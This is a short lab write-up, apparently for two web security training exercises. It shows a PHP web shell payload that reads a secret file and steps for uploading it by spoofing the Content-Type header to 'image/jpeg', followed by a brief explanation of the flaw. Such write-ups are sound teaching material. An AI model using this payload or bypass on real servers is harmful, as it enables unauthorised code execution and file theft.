# Lab-1: Remote code execution via web shell upload

```php

PAYLOAD: <?php echo file_get_contents('/home/carlos/secret'); ?>

```




![FILE-UPLOAD-VULNERABILITY-LAB-1-RCE-VIA-UPLOAD](https://user-images.githubusercontent.com/98345027/183827329-e98be45c-e763-4e30-85a1-565d42ba9df3.png)



# Lab-2: Web shell upload via Content-Type restriction bypass

```php
PAYLOAD: <?php echo file_get_contents('/home/carlos/secret'); ?>
STEPS
1.FIRST UPLOAD THE SCRIPT(EXAMPLE: SCRIPT.php) AND THEN GO TO PROXY-->HTTP HISTORY FROM THERE SELECT THE 'POST' REQUEST AND SEND IT TO REPEATER OVER THERE CHANGE THE "Content-Type" to "image/jpeg" inorder to bypass file type and then "send" the request .
2.IN THE "RESPONSE" SECTION IT SHOWS MESSAGE THAT THE FILE UPLOAD SUCCESSFULLY "
3.NOW TO RUN THE SCRIPT GO TO PROXY--->HTTP-HISTORY SELECT THE "GET" REQUEST AND ACCESS THE SCRIPT "/images/avtar/newsccript.php' and send the request
4.In "REPONSE SECTION " IT WILL SHOW THE SECRET MESSAGE "
```
```TEXT
ACTUAL FLAW: OVER HERE Content-Type header,  tells the server the MIME type of the data that was submitted using this input. (FOR-EXAMPLE WHETHER THE FILE SUBMITTED OVER HERE ARE IMAGE OR NOT)
BYPASS: SO WE CANGE THE CONTENT-TYPE AND THE SERVER DOESN'T VALIDATE THAT FILE THAT WAS UPLOADED WAS IMAGE FILE OR SOMETHING ELSE
```


![FILE-UPLOAD-VULNERABILITY-LAB-2](https://user-images.githubusercontent.com/98345027/183828255-7d93e239-5e5c-4515-a179-db7138a29a06.png)
![FILE-UPLOAD-VULNERABILITY-LAB-2-1](https://user-images.githubusercontent.com/98345027/183828268-a9c4bf5d-c944-4e9b-b3bd-68fae2cf184b.png)
